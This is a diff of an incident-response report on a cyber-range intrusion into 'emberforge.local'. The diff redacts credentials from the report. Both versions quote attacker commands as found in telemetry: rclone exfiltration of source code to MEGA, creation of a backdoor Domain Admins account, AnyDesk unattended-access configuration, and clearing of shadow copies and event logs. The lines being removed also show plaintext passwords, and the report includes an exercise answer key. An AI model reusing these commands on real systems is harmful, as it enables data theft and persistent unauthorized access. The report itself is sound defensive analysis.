@@ -5,13 +5,13 @@
 **Analyst:** Rich Vincent  
 **Date Completed:** 2026-04-04  
 **Data Source:** `EmberForgeX_CL` (Sysmon + Windows Security events, 18,250 rows)  
-**Sentinel Workspace:** `LAW-Cyber-Range` — `60c7f53e-249a-4077-b68e-55a4ae877d7c`
+**Sentinel Workspace:** `LAW-Cyber-Range`
 
 ---
 
 ## Executive Summary
 
-A threat actor compromised the `emberforge.local` domain through a phishing-delivered ISO file, achieving full domain compromise in a single attack session. The attacker exfiltrated the entire `C:\GameDev` source code repository (42.3 GB) to MEGA cloud storage using the credential `jwilson.vhr@proton.me` / `Summer2024!`. Domain credentials were stolen via NTDS.dit extraction from a VSS shadow copy on the Domain Controller. The attacker established persistent remote access via AnyDesk and created a backdoor domain admin account (`svc_backup`). Security and System event logs on the DC were subsequently cleared to impede forensic investigation — however, Sysmon telemetry survived the clearing and provides near-complete reconstruction of the attack chain.
+A threat actor compromised the `emberforge.local` domain through a phishing-delivered ISO file, achieving full domain compromise in a single attack session. The attacker exfiltrated the entire `C:\GameDev` source code repository (42.3 GB) to MEGA cloud storage using a credential exposed in process telemetry. Domain credentials were stolen via NTDS.dit extraction from a VSS shadow copy on the Domain Controller. The attacker established persistent remote access via AnyDesk and created a backdoor domain admin account (`svc_backup`). Security and System event logs on the DC were subsequently cleared to impede forensic investigation — however, Sysmon telemetry survived the clearing and provides near-complete reconstruction of the attack chain.
 
 **Three hosts compromised:**
 | Hostname | Role | OS |
@@ -155,24 +155,24 @@ Compress-Archive -Path C:\GameDev -DestinationPath C:\Users\Public\gamedev.zip
 ```
 echo [mega]>> C:\Users\Public\rclone.conf
 echo type = mega>> C:\Users\Public\rclone.conf
-echo user = jwilson.vhr@proton.me>> C:\Users\Public\rclone.conf
-echo pass = 1PS7P86ziG00iZmuq5XFbyEXKkkB8ClOiwBY>> C:\Users\Public\rclone.conf
+echo user = <redacted-attacker-account>> C:\Users\Public\rclone.conf
+echo pass = <redacted-obfuscated-password>> C:\Users\Public\rclone.conf
 ```
 
 The rclone-obfuscated password was generated via:
 ```
-rclone.exe obscure Summer2024!   →   1PS7P86ziG00iZmuq5XFbyEXKkkB8ClOiwBY
+rclone.exe obscure <redacted>   →   <redacted-obfuscated-password>
 ```
 
 **Exfil commands:**
 ```
 rclone.exe --config C:\Users\Public\rclone.conf copy C:\GameDev mega:exfil -v
-rclone.exe copy C:\GameDev mega:exfil --mega-user jwilson.vhr@proton.me --mega-pass Summer2024! -v
+rclone.exe copy C:\GameDev mega:exfil --mega-user <redacted-attacker-account> --mega-pass <redacted> -v
 ```
 
 **Attacker credentials exposed in plaintext:**
-- MEGA account: `jwilson.vhr@proton.me`
-- MEGA password: `Summer2024!`
+- MEGA account: `<redacted-attacker-account>`
+- MEGA password: `<redacted>`
 
 ### Phase 6 — Lateral Movement to Domain Controller (EC2AMAZ-EEU3IA2)
 
@@ -202,11 +202,11 @@ vssadmin delete shadows /shadow="{0ed56514-...}" /Quiet    [service: YOzedHWI]
 ### Phase 7 — Backdoor Account Creation (EC2AMAZ-EEU3IA2)
 
 ```
-net user svc_backup P@ssw0rd123! /add /domain
+net user svc_backup <redacted> /add /domain
 net group "Domain Admins" svc_backup /add /domain
 ```
 
-**Backdoor account:** `svc_backup` / `P@ssw0rd123!` — added directly to Domain Admins.
+**Backdoor account:** `svc_backup` / `<redacted>` — added directly to Domain Admins.
 
 ### Phase 8 — Remote Access Persistence (EC2AMAZ-B9GHHO6)
 
@@ -220,13 +220,13 @@ net start AnyDesk
 ```
 cmd.exe /c type C:\ProgramData\AnyDesk\system.conf
 cmd.exe /c echo ad.security.interactive_access=2 >> C:\ProgramData\AnyDesk\system.conf
-cmd.exe /c echo ad.security.unattended_access_password_hash=5e884898da28047d91089d3f7c6e12d05d0fb9e2 >> C:\ProgramData\AnyDesk\system.conf
+cmd.exe /c echo ad.security.unattended_access_password_hash=<redacted> >> C:\ProgramData\AnyDesk\system.conf
 ```
 
 - `interactive_access=2` — allows unattended connections without user approval
-- `5e884898da28047d91089d3f7c6e12d05d0fb9e2` — SHA1 hash of `password`
+- The unattended-access password hash is redacted from this public report.
 
-**AnyDesk unattended password:** `password`
+**AnyDesk unattended password:** `<redacted>`
 
 **Config location:** `C:\ProgramData\AnyDesk\system.conf`
 
@@ -282,15 +282,15 @@ Executed via smbexec (svchost → cmd → wevtutil). The Security and System eve
 | `sync.cloud-endpoint.net` | Staging domain | Payload delivery (port 8080 HTTP) |
 | `104.21.30.237` | C2 IP | Primary C2 endpoint |
 | `172.67.174.46` | C2 IP | Secondary C2 endpoint |
-| `jwilson.vhr@proton.me` | Attacker email | MEGA exfil account |
-| `Summer2024!` | Credential | MEGA password (exposed in rclone args) |
+| `<redacted-attacker-account>` | Attacker email | MEGA exfil account |
+| `<redacted>` | Credential | MEGA password (exposed in rclone args) |
 
 ### Compromised Domain Credentials
 
 | Account | Password | Source | Privilege |
 |---|---|---|---|
-| `svc_backup` | `P@ssw0rd123!` | Attacker-created | Domain Admin |
-| `jwilson.vhr@proton.me` | `Summer2024!` | Attacker MEGA account | N/A |
+| `svc_backup` | `<redacted>` | Attacker-created | Domain Admin |
+| `<redacted-attacker-account>` | `<redacted>` | Attacker MEGA account | N/A |
 | All domain accounts | (via ntds.dit) | NTDS.dit extraction | All |
 
 ---
@@ -302,11 +302,11 @@ Executed via smbexec (svchost → cmd → wevtutil). The Security and System eve
 | Q00 | Custom log table | `EmberForgeX_CL` |
 | Q01 | Exfil source directory | `C:\GameDev` |
 | Q02 | Cloud provider | MEGA |
-| Q03 | Attacker email | `jwilson.vhr@proton.me` |
+| Q03 | Attacker email | `<redacted-attacker-account>` |
 | Q04 | Domain credential file | `ntds.dit` |
 | Q05 | Exfil tool | `rclone.exe` |
 | Q06 | Exfil destination IP | *(MEGA cloud IP)* |
-| Q07 | Plaintext MEGA password | `Summer2024!` |
+| Q07 | Plaintext MEGA password | `<redacted>` |
 | Q08 | Archive cmdlet | `Compress-Archive` |
 | Q09 | Staging server | `sync.cloud-endpoint.net` |
 | Q10 | Earliest malicious process | `review.dll` |
@@ -336,9 +336,9 @@ Executed via smbexec (svchost → cmd → wevtutil). The Security and System eve
 | Q34 | Failed lateral movement protocol | `NTLM` |
 | Q35 | DC arrival sequence | `whoami > vssadmin.exe` |
 | Q36 | Backdoor account | `svc_backup` |
-| Q37 | Backdoor password | `P@ssw0rd123!` |
+| Q37 | Backdoor password | `<redacted>` |
 | Q38 | Privilege group | `Domain Admins` |
-| Q39 | Exposed credential | `Summer2024!` |
+| Q39 | Exposed credential | `<redacted>` |
 | Q40 | Scheduled task (flag) | `WindowsUpdate` |
 | Q41 | Remote access tool | `AnyDesk` |
 | Q42 | Remote access config path | `C:\ProgramData\AnyDesk\system.conf` |
@@ -364,7 +364,7 @@ The attacker used `wevtutil cl Security` and `wevtutil cl System` on the DC, cre
 
 1. **Rotate all domain credentials** — ntds.dit was exfiltrated; all password hashes are compromised
 2. **Disable/delete `svc_backup`** domain admin account
-3. **Revoke MEGA access** for `jwilson.vhr@proton.me` and report to MEGA abuse team
+3. **Revoke the attacker-controlled MEGA account** and report it to the MEGA abuse team
 4. **Remove AnyDesk service** from EC2AMAZ-B9GHHO6 and invalidate all AnyDesk IDs
 5. **Delete `WindowsUpdate` scheduled task** and remove `update.exe` from Public folder
 6. **Block C2 domains/IPs:** `cdn.cloud-endpoint.net`, `sync.cloud-endpoint.net`, `104.21.30.237`, `172.67.174.46`
